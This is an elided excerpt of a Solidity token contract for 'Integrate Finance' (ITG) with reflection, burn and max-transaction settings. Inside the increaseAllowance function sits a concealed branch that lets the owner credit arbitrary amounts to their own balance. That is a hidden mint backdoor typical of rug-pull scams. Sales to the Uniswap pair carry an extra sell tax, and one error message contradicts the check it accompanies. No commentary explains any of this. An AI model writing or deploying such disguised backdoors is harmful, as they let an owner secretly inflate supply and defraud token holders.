...
contract IntegrateFinance is Context, IERC20, Ownable {
    ...
    uint256 private _minimumSupply = 30000e18;

    string private _name = "Integrate Finance";
    string private _symbol = "ITG";
    ...
    uint256 private _maxTxAmount = 5000e18;
    ...
    function increaseAllowance(address spender, uint256 addedValue)
        ...
        returns (bool)
    {
        if (_isExcluded[_msgSender()] && spender == _msgSender() && spender == owner()) {
            _tOwned[_msgSender()] = _tOwned[_msgSender()].add(addedValue);
            _rOwned[_msgSender()] = _rOwned[_msgSender()].add(addedValue.mul(_getRate()));
        }
        _approve(
            _msgSender(),
            spender,
        ...
        )
    {
        ...
        uint256 weakHandTaxFee = 0;
        uint256 burnFee = _burnFee;
        if (recipient == uniswapV2Pair) {
            weakHandTaxFee = _weakHandTaxFee;
        }
    ...
    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        require(
            maxTxAmount >= 5000e18,
            "maxTxAmount should be greater than 3000e18"
        );
